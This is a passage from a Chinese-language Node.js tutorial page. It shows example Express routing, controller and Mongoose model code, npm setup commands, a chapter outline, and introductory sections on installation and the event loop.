服务器，并挂载路由和中间件。</li></ul></li><li>**<code>package.json</code>**：<ul><li>描述项目的依赖、版本信息和启动脚本。通过 <strong>npm install</strong> 安装的依赖都会记录在这里。</li></ul></li><li>**<code>.env</code>**：<ul><li>用于存储敏感的环境变量，例如数据库连接字符串、API 密钥等。</li></ul></li></ol><hr><h2 id="app-js（主入口文件）示例"><a href="#app-js（主入口文件）示例" class="headerlink" title="app.js（主入口文件）示例"></a><strong>app.js（主入口文件）示例</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php">javascript复制代码<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">express</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">path</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">dotenv</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;dotenv&#x27;</span>);<br><br><span class="hljs-comment">// 加载环境变量</span><br>dotenv.<span class="hljs-title function_ invoke__">config</span>();<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">app</span> = <span class="hljs-title function_ invoke__">express</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = process.env.PORT || <span class="hljs-number">3000</span>;<br><br><span class="hljs-comment">// 设置静态资源目录</span><br>app.<span class="hljs-keyword">use</span>(express.<span class="hljs-built_in">static</span>(path.<span class="hljs-title function_ invoke__">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br><span class="hljs-comment">// 设置模板引擎（EJS）</span><br>app.<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br>app.<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_ invoke__">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));<br><br><span class="hljs-comment">// 路由</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">indexRouter</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;./routes/index&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">usersRouter</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;./routes/users&#x27;</span>);<br><br><span class="hljs-comment">// 挂载路由</span><br>app.<span class="hljs-keyword">use</span>(<span class="hljs-string">&#x27;/&#x27;</span>, indexRouter);<br>app.<span class="hljs-keyword">use</span>(<span class="hljs-string">&#x27;/users&#x27;</span>, usersRouter);<br><br><span class="hljs-comment">// 启动服务器</span><br>app.<span class="hljs-title function_ invoke__">listen</span>(PORT, () =&gt; &#123;<br>  console.<span class="hljs-title function_ invoke__">log</span>(`Server running on <span class="hljs-attr">http</span>://<span class="hljs-attr">localhost</span>:$&#123;PORT&#125;`);<br>&#125;);<br></code></pre></td></tr></table></figure><hr><h2 id="示例路由文件-routes-index-js"><a href="#示例路由文件-routes-index-js" class="headerlink" title="示例路由文件 (/routes/index.js)"></a><strong>示例路由文件 (<code>/routes/index.js</code>)</strong></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">javascript复制代码<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> router = express.<span class="hljs-title class_">Router</span>();<br><br><span class="hljs-comment">// 定义首页路由</span><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;Home Page&#x27;</span> &#125;);<br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><hr><h2 id="示例控制器文件-controllers-userController-js"><a href="#示例控制器文件-controllers-userController-js" class="headerlink" title="示例控制器文件 (/controllers/userController.js)"></a><strong>示例控制器文件 (<code>/controllers/userController.js</code>)</strong></h2><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dart">javascript复制代码<span class="hljs-keyword">const</span> User = require(<span class="hljs-string">&#x27;../models/userModel&#x27;</span>);<br><br><span class="hljs-comment">// 获取所有用户</span><br>exports.getAllUsers = <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> users = <span class="hljs-keyword">await</span> User.find(); <span class="hljs-comment">// 从数据库中查询用户</span><br>    res.status(<span class="hljs-number">200</span>).json(users);<br>  &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>    res.status(<span class="hljs-number">500</span>).json(&#123; message: <span class="hljs-string">&#x27;Error retrieving users&#x27;</span> &#125;);<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><hr><h2 id="示例模型文件-models-userModel-js"><a href="#示例模型文件-models-userModel-js" class="headerlink" title="示例模型文件 (/models/userModel.js)"></a><strong>示例模型文件 (<code>/models/userModel.js</code>)</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">javascript复制代码<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">mongoose</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;mongoose&#x27;</span>);<br><br><span class="hljs-comment">// 定义用户模型</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">userSchema</span> = <span class="hljs-keyword">new</span> mongoose.<span class="hljs-title function_ invoke__">Schema</span>(&#123;<br>  <span class="hljs-attr">name</span>: &#123; <span class="hljs-attr">type</span>: String, <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span> &#125;,<br>  <span class="hljs-attr">email</span>: &#123; <span class="hljs-attr">type</span>: String, <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">unique</span>: <span class="hljs-literal">true</span> &#125;,<br>  <span class="hljs-attr">password</span>: &#123; <span class="hljs-attr">type</span>: String, <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span> &#125;<br>&#125;);<br><br>module.exports = mongoose.<span class="hljs-title function_ invoke__">model</span>(<span class="hljs-string">&#x27;User&#x27;</span>, userSchema);<br></code></pre></td></tr></table></figure><hr><h2 id="运行-Node-js-项目"><a href="#运行-Node-js-项目" class="headerlink" title="运行 Node.js 项目"></a><strong>运行 Node.js 项目</strong></h2><ol><li><p><strong>初始化项目</strong>：</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">bash<br><br><br>复制代码<br><span class="hljs-built_in">npm</span> init -y<br></code></pre></td></tr></table></figure></li><li><p><strong>安装依赖</strong>：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">bash</span><br><span class="hljs-keyword"></span><br><br>复制代码<br>npm <span class="hljs-keyword">install </span>express mongoose dotenv ejs<br></code></pre></td></tr></table></figure></li><li><p><strong>运行项目</strong>：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">bash<br><br><br>复制代码<br><span class="hljs-keyword">node</span> <span class="hljs-title">app</span>.js<br></code></pre></td></tr></table></figure></li><li><p>打开浏览器访问：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts">arduino<br><br><br>复制代码<br><span class="hljs-symbol">http:</span><span class="hljs-comment">//localhost:3000</span><br></code></pre></td></tr></table></figure></li></ol><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><p>一个典型的 <strong>Node.js Web 项目</strong>包含以下结构：</p><ul><li>**<code>/public</code>**：存放静态资源（HTML、CSS、JS）。</li><li>**<code>/routes</code>**：定义路由。</li><li>**<code>/controllers</code>**：处理业务逻辑。</li><li>**<code>/models</code>**：定义数据库模型。</li><li>**<code>app.js</code>**：Express 应用的入口文件。</li></ul><h2 id="1-Node-js-基础"><a href="#1-Node-js-基础" class="headerlink" title="1. Node.js 基础"></a>1. Node.js 基础</h2><ul><li><a href="#11-%E4%BB%80%E4%B9%88%E6%98%AF-nodejs">1.1 什么是 Node.js</a></li><li><a href="#12-nodejs-%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE">1.2 Node.js 安装与配置</a></li><li><a href="#13-nodejs-%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6%E4%B8%8E%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF">1.3 Node.js 运行机制与事件循环</a></li><li><a href="#14-nodejs-%E4%B8%8E-javascript-%E7%9A%84%E5%8C%BA%E5%88%AB">1.4 Node.js 与 JavaScript 的区别</a></li></ul><h2 id="2-模块与包管理"><a href="#2-模块与包管理" class="headerlink" title="2. 模块与包管理"></a>2. 模块与包管理</h2><ul><li><p><a href="#21-nodejs-%E5%86%85%E7%BD%AE%E6%A8%A1%E5%9D%97">2.1 Node.js 内置模块</a></p><ul><li><a href="#211-fs-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%A8%A1%E5%9D%97">2.1.1 <code>fs</code> 文件系统模块</a></li><li><a href="#212-http-%E6%A8%A1%E5%9D%97">2.1.2 <code>http</code> 模块</a></li><li><a href="#213-path-%E6%A8%A1%E5%9D%97">2.1.3 <code>path</code> 模块</a></li><li><a href="#214-os-%E6%A8%A1%E5%9D%97">2.1.4 <code>os</code> 模块</a></li><li><a href="#215-crypto-%E6%A8%A1%E5%9D%97">2.1.5 <code>crypto</code> 模块</a></li></ul></li><li><p><a href="#22-%E4%BD%BF%E7%94%A8-npm-%E5%92%8C%E5%8C%85%E7%AE%A1%E7%90%86">2.2 使用 NPM 和包管理</a></p><ul><li><a href="#221-npm-%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8">2.2.1 NPM 的安装和使用</a></li><li><a href="#222-%E7%AE%A1%E7%90%86%E9%A1%B9%E7%9B%AE%E4%BE%9D%E8%B5%96">2.2.2 管理项目依赖</a></li><li><a href="#223-%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E4%B8%8E%E8%AF%AD%E4%B9%89%E5%8C%96%E7%89%88%E6%9C%AC">2.2.3 版本控制与语义化版本</a></li><li><a href="#224-%E4%BD%BF%E7%94%A8-packagejson-%E7%AE%A1%E7%90%86%E9%A1%B9%E7%9B%AE">2.2.4 使用 <code>package.json</code> 管理项目</a></li></ul></li><li><p><a href="#23-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A8%A1%E5%9D%97%E4%B8%8E-commonjs-%E8%A7%84%E8%8C%83">2.3 自定义模块与 CommonJS 规范</a></p><ul><li><a href="#231-%E5%AF%BC%E5%85%A5%E4%B8%8E%E5%AF%BC%E5%87%BA%E6%A8%A1%E5%9D%97">2.3.1 导入与导出模块</a></li><li><a href="#232-commonjs-%E5%92%8C-es6-%E6%A8%A1%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB">2.3.2 CommonJS 和 ES6 模块的区别</a></li></ul></li></ul><h2 id="3-异步编程"><a href="#3-异步编程" class="headerlink" title="3. 异步编程"></a>3. 异步编程</h2><ul><li><p><a href="#31-%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80">3.1 异步编程基础</a></p><ul><li><a href="#311-%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0">3.1.1 回调函数</a></li><li><a href="#312-promise-%E5%AF%B9%E8%B1%A1">3.1.2 <code>Promise</code> 对象</a></li><li><a href="#313-asyncawait-%E8%AF%AD%E6%B3%95">3.1.3 <code>async/await</code> 语法</a></li></ul></li><li><p><a href="#32-%E4%BA%8B%E4%BB%B6%E9%A9%B1%E5%8A%A8%E7%BC%96%E7%A8%8B">3.2 事件驱动编程</a></p><ul><li><a href="#321-%E4%BD%BF%E7%94%A8-eventemitter">3.2.1 使用 <code>EventEmitter</code></a></li><li><a href="#322-%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86">3.2.2 自定义事件处理</a></li></ul></li><li><p><a href="#33-%E5%BC%82%E6%AD%A5%E6%8E%A7%E5%88%B6%E6%B5%81%E7%AE%A1%E7%90%86">3.3 异步控制流管理</a></p><ul><li><a href="#331-asyncjs-%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8">3.3.1 <code>async.js</code> 库的使用</a></li><li><a href="#332-%E5%BC%82%E6%AD%A5%E9%98%9F%E5%88%97%E4%B8%8E%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6">3.3.2 异步队列与并发控制</a></li></ul></li></ul><h2 id="4-文件操作与-I-O"><a href="#4-文件操作与-I-O" class="headerlink" title="4. 文件操作与 I&#x2F;O"></a>4. 文件操作与 I&#x2F;O</h2><ul><li><p><a href="#41-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%93%8D%E4%BD%9C">4.1 文件系统操作</a></p><ul><li><a href="#411-%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6">4.1.1 读取与写入文件</a></li><li><a href="#412-%E6%96%87%E4%BB%B6%E6%B5%81%E4%B8%8E%E5%A4%A7%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86">4.1.2 文件流与大文件处理</a></li></ul></li><li><p><a href="#42-%E7%BD%91%E7%BB%9C-io-%E6%93%8D%E4%BD%9C">4.2 网络 I&#x2F;O 操作</a></p><ul><li><a href="#421-%E5%88%9B%E5%BB%BA-http-%E6%9C%8D%E5%8A%A1%E5%99%A8">4.2.1 创建 HTTP 服务器</a></li><li><a href="#422-%E5%A4%84%E7%90%86%E8%AF%B7%E6%B1%82%E4%B8%8E%E5%93%8D%E5%BA%94">4.2.2 处理请求与响应</a></li><li><a href="#423-%E4%BD%BF%E7%94%A8-https-%E6%A8%A1%E5%9D%97%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E9%80%9A%E4%BF%A1">4.2.3 使用 <code>https</code> 模块进行安全通信</a></li></ul></li></ul><h2 id="5-数据库与存储"><a href="#5-数据库与存储" class="headerlink" title="5. 数据库与存储"></a>5. 数据库与存储</h2><ul><li><p><a href="#51-%E4%BD%BF%E7%94%A8-mongodb">5.1 使用 MongoDB</a></p><ul><li><a href="#511-%E8%BF%9E%E6%8E%A5%E5%88%B0-mongodb">5.1.1 连接到 MongoDB</a></li><li><a href="#512-crud-%E6%93%8D%E4%BD%9C">5.1.2 CRUD 操作</a></li><li><a href="#513-%E4%BD%BF%E7%94%A8-mongoose-%E8%BF%9B%E8%A1%8C%E6%95%B0%E6%8D%AE%E5%BB%BA%E6%A8%A1">5.1.3 使用 Mongoose 进行数据建模</a></li></ul></li><li><p><a href="#52-%E4%BD%BF%E7%94%A8-mysql">5.2 使用 MySQL</a></p><ul><li><a href="#521-%E8%BF%9E%E6%8E%A5%E5%88%B0-mysql">5.2.1 连接到 MySQL</a></li><li><a href="#522-%E6%89%A7%E8%A1%8C-sql-%E6%9F%A5%E8%AF%A2">5.2.2 执行 SQL 查询</a></li><li><a href="#523-%E4%BD%BF%E7%94%A8-sequelize-%E8%BF%9B%E8%A1%8C-orm-%E6%98%A0%E5%B0%84">5.2.3 使用 <code>sequelize</code> 进行 ORM 映射</a></li></ul></li></ul><h2 id="6-Web-开发与框架"><a href="#6-Web-开发与框架" class="headerlink" title="6. Web 开发与框架"></a>6. Web 开发与框架</h2><ul><li><p><a href="#61-%E4%BD%BF%E7%94%A8-express-%E6%A1%86%E6%9E%B6">6.1 使用 Express 框架</a></p><ul><li><a href="#611-%E5%88%9B%E5%BB%BA%E5%9F%BA%E6%9C%AC%E7%9A%84-express-%E5%BA%94%E7%94%A8">6.1.1 创建基本的 Express 应用</a></li><li><a href="#612-%E8%B7%AF%E7%94%B1%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6">6.1.2 路由与中间件</a></li><li><a href="#613-%E5%A4%84%E7%90%86%E8%A1%A8%E5%8D%95%E5%92%8C-json-%E6%95%B0%E6%8D%AE">6.1.3 处理表单和 JSON 数据</a></li><li><a href="#614-%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86">6.1.4 错误处理</a></li></ul></li><li><p><a href="#62-%E4%BD%BF%E7%94%A8-koa-%E6%A1%86%E6%9E%B6">6.2 使用 Koa 框架</a></p><ul><li><a href="#621-koa-%E7%9A%84%E7%89%B9%E7%82%B9%E4%B8%8E-express-%E5%AF%B9%E6%AF%94">6.2.1 Koa 的特点与 Express 对比</a></li><li><a href="#622-%E5%88%9B%E5%BB%BA-koa-%E5%BA%94%E7%94%A8">6.2.2 创建 Koa 应用</a></li><li><a href="#623-%E4%B8%AD%E9%97%B4%E4%BB%B6%E4%B8%8E%E8%B7%AF%E7%94%B1%E5%A4%84%E7%90%86">6.2.3 中间件与路由处理</a></li></ul></li><li><p><a href="#63-%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E">6.3 模板引擎</a></p><ul><li><a href="#631-%E4%BD%BF%E7%94%A8-ejs">6.3.1 使用 EJS</a></li><li><a href="#632-%E4%BD%BF%E7%94%A8-handlebars">6.3.2 使用 Handlebars</a></li><li><a href="#633-%E4%BD%BF%E7%94%A8-pug">6.3.3 使用 Pug</a></li></ul></li></ul><h2 id="7-测试与调试"><a href="#7-测试与调试" class="headerlink" title="7. 测试与调试"></a>7. 测试与调试</h2><ul><li><p><a href="#71-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E4%B8%8E%E9%9B%86%E6%88%90%E6%B5%8B%E8%AF%95">7.1 单元测试与集成测试</a></p><ul><li><a href="#711-%E4%BD%BF%E7%94%A8-mocha-%E8%BF%9B%E8%A1%8C%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95">7.1.1 使用 Mocha 进行单元测试</a></li><li><a href="#712-%E4%BD%BF%E7%94%A8-chai-%E8%BF%9B%E8%A1%8C%E6%96%AD%E8%A8%80">7.1.2 使用 Chai 进行断言</a></li><li><a href="#713-%E6%B5%8B%E8%AF%95%E5%BC%82%E6%AD%A5%E4%BB%A3%E7%A0%81">7.1.3 测试异步代码</a></li></ul></li><li><p><a href="#72-%E8%B0%83%E8%AF%95-nodejs-%E5%BA%94%E7%94%A8">7.2 调试 Node.js 应用</a></p><ul><li><a href="#721-%E4%BD%BF%E7%94%A8-consolelog-%E8%B0%83%E8%AF%95">7.2.1 使用 <code>console.log</code> 调试</a></li><li><a href="#722-%E4%BD%BF%E7%94%A8-nodejs-%E5%86%85%E7%BD%AE%E8%B0%83%E8%AF%95%E5%99%A8">7.2.2 使用 <code>Node.js</code> 内置调试器</a></li><li><a href="#723-%E4%BD%BF%E7%94%A8-vs-code-%E8%B0%83%E8%AF%95-nodejs-%E5%BA%94%E7%94%A8">7.2.3 使用 <code>VS Code</code> 调试 Node.js 应用</a></li></ul></li></ul><h2 id="8-部署与性能优化"><a href="#8-部署与性能优化" class="headerlink" title="8. 部署与性能优化"></a>8. 部署与性能优化</h2><ul><li><p><a href="#81-%E9%83%A8%E7%BD%B2-nodejs-%E5%BA%94%E7%94%A8">8.1 部署 Node.js 应用</a></p><ul><li><a href="#811-%E4%BD%BF%E7%94%A8-pm2-%E8%BF%9B%E8%A1%8C%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86">8.1.1 使用 <code>PM2</code> 进行进程管理</a></li><li><a href="#812-docker-%E9%83%A8%E7%BD%B2-nodejs-%E5%BA%94%E7%94%A8">8.1.2 Docker 部署 Node.js 应用</a></li><li><a href="#813-%E5%9C%A8%E4%BA%91%E5%B9%B3%E5%8F%B0%E4%B8%8A%E9%83%A8%E7%BD%B2-nodejs">8.1.3 在云平台上部署 Node.js</a></li></ul></li><li><p><a href="#82-%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E4%B8%8E%E7%BC%93%E5%AD%98">8.2 性能优化与缓存</a></p><ul><li><a href="#821-%E4%BD%BF%E7%94%A8-redis-%E7%BC%93%E5%AD%98">8.2.1 使用 Redis 缓存</a></li><li><a href="#822-%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%96%E4%B8%8E%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6">8.2.2 内存优化与垃圾回收</a></li><li><a href="#823-%E4%BD%BF%E7%94%A8%E9%9B%86%E7%BE%A4%E6%A8%A1%E5%BC%8F%E6%8F%90%E9%AB%98%E6%80%A7%E8%83%BD">8.2.3 使用集群模式提高性能</a></li></ul></li></ul><h2 id="9-安全性"><a href="#9-安全性" class="headerlink" title="9. 安全性"></a>9. 安全性</h2><ul><li><p><a href="#91-%E5%AE%89%E5%85%A8%E6%80%A7%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5">9.1 安全性最佳实践</a></p><ul><li><a href="#911-%E9%98%B2%E6%AD%A2%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">9.1.1 防止注入攻击</a></li><li><a href="#912-%E9%98%B2%E6%AD%A2%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-xss">9.1.2 防止跨站脚本攻击 (XSS)</a></li><li><a href="#913-%E4%BD%BF%E7%94%A8-helmetjs-%E4%BF%9D%E6%8A%A4%E5%BA%94%E7%94%A8">9.1.3 使用 <code>helmet.js</code> 保护应用</a></li></ul></li><li><p><a href="#92-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%8E%E6%8E%88%E6%9D%83">9.2 身份验证与授权</a></p><ul><li><a href="#921-%E4%BD%BF%E7%94%A8-jwt-%E8%BF%9B%E8%A1%8C%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81">9.2.1 使用 JWT 进行身份验证</a></li><li><a href="#922-oauth-%E4%B8%8E%E7%AC%AC%E4%B8%89%E6%96%B9%E7%99%BB%E5%BD%95%E9%9B%86%E6%88%90">9.2.2 OAuth 与第三方登录集成</a></li></ul></li><li><p><a href="#93-ssl-%E4%B8%8E-https">9.3 SSL 与 HTTPS</a></p><ul><li><a href="#931-%E7%94%9F%E6%88%90%E4%B8%8E%E9%85%8D%E7%BD%AE-ssl-%E8%AF%81%E4%B9%A6">9.3.1 生成与配置 SSL 证书</a></li><li><a href="#932-%E4%BD%BF%E7%94%A8-https-%E6%A8%A1%E5%9D%97">9.3.2 使用 <code>https</code> 模块</a></li></ul></li></ul><h2 id="10-实战项目"><a href="#10-实战项目" class="headerlink" title="10. 实战项目"></a>10. 实战项目</h2><ul><li><p><a href="#101-%E6%9E%84%E5%BB%BA-restful-api">10.1 构建 RESTful API</a></p><ul><li><a href="#1011-restful-api-%E5%9F%BA%E7%A1%80">10.1.1 RESTful API 基础</a></li><li><a href="#1012-%E4%BD%BF%E7%94%A8-express-%E6%9E%84%E5%BB%BA-api">10.1.2 使用 Express 构建 API</a></li></ul></li><li><p><a href="#102-%E5%AE%9E%E7%8E%B0-websocket-%E9%80%9A%E4%BF%A1">10.2 实现 WebSocket 通信</a></p><ul><li><a href="#1021-websocket-%E5%9F%BA%E7%A1%80">10.2.1 WebSocket 基础</a></li><li><a href="#1022-%E4%BD%BF%E7%94%A8-ws-%E5%AE%9E%E7%8E%B0-websocket-%E6%9C%8D%E5%8A%A1">10.2.2 使用 <code>ws</code> 实现 WebSocket 服务</a></li></ul></li><li><p><a href="#103-%E4%BD%BF%E7%94%A8-graphql-%E6%9E%84%E5%BB%BA-api">10.3 使用 GraphQL 构建 API</a></p><ul><li><p><a href="#1031-graphql-%E6%A6%82%E8%BF%B0">10.3.1 GraphQL 概述</a></p></li><li><p><a href="#1032-%E4%BD%BF%E7%94%A8-apollo-server-%E6%9E%84%E5%BB%BA-graphql-api">10.3.2 使用 Apollo Server 构建 GraphQL API</a></p></li></ul></li></ul><h3 id="1-1-什么是-Node-js"><a href="#1-1-什么是-Node-js" class="headerlink" title="1.1 什么是 Node.js"></a>1.1 什么是 Node.js</h3><p>Node.js 是一个基于 <strong>Chrome V8 JavaScript 引擎</strong> 构建的 JavaScript 运行环境。它允许开发者使用 JavaScript 编写后端代码，因此前后端可以共享同一种语言。Node.js 主要用于开发网络服务器、实时应用程序、命令行工具等，具有以下特点：</p><ul><li><strong>事件驱动</strong>：Node.js 的事件驱动架构使其能够高效地处理并发连接。</li><li><strong>异步非阻塞 I&#x2F;O</strong>：通过异步处理，Node.js 可以在不阻塞程序执行的情况下处理 I&#x2F;O 操作（文件系统、网络请求等）。</li><li><strong>单线程模型</strong>：尽管 Node.js 是单线程的，但它通过事件循环和异步编程支持高并发处理。</li></ul><h3 id="1-2-Node-js-安装与配置"><a href="#1-2-Node-js-安装与配置" class="headerlink" title="1.2 Node.js 安装与配置"></a>1.2 Node.js 安装与配置</h3><h4 id="1-2-1-在不同平台上安装-Node-js"><a href="#1-2-1-在不同平台上安装-Node-js" class="headerlink" title="1.2.1 在不同平台上安装 Node.js"></a>1.2.1 在不同平台上安装 Node.js</h4><ul><li><strong>Windows</strong>：访问 <a href="https://nodejs.org/">Node.js 官网</a> 下载适合你的安装包，并运行安装程序。</li><li><strong>macOS</strong>：使用 Homebrew 安装：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">brew install node<br></code></pre></td></tr></table></figure></li><li><strong>Linux</strong>：通过包管理器安装：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt install nodejs npm<br></code></pre></td></tr></table></figure></li></ul><h4 id="1-2-2-验证安装"><a href="#1-2-2-验证安装" class="headerlink" title="1.2.2 验证安装"></a>1.2.2 验证安装</h4><p>在终端中输入以下命令，确保 Node.js 和 npm 安装成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">node -v<br>npm -v<br></code></pre></td></tr></table></figure><h3 id="1-3-Node-js-运行机制与事件循环"><a href="#1-3-Node-js-运行机制与事件循环" class="headerlink" title="1.3 Node.js 运行机制与事件循环"></a>1.3 Node.js 运行机制与事件循环</h3><p>Node.js 使用 <strong>事件驱动</strong> 和 <strong>非阻塞 I&#x2F;O 模型</strong> 来处理高并发。它基于 <strong>单线程</strong> 处理所有的请求，通过事件循环管理异步操作。</p><h4 id="1-3-1-事件循环的工作原理"><a href="#1-3-1-事件循环的工作原理" class="headerlink" title="1.3.1 事件循环的工作原理"></a>1.3.1 事件循环的工作原理</h4><p>事件循环是 Node.js 的核心，它允许 Node.js 处理异步 I&#x2F;O 操作而不阻塞主线程。每次异步操作被注册到事件循环中，当 I&#x2F;O 操作完成时，相关的回调函数会被放入任务队列，等待事件循环调度执行。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Start&#x27;</span>);<br><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span 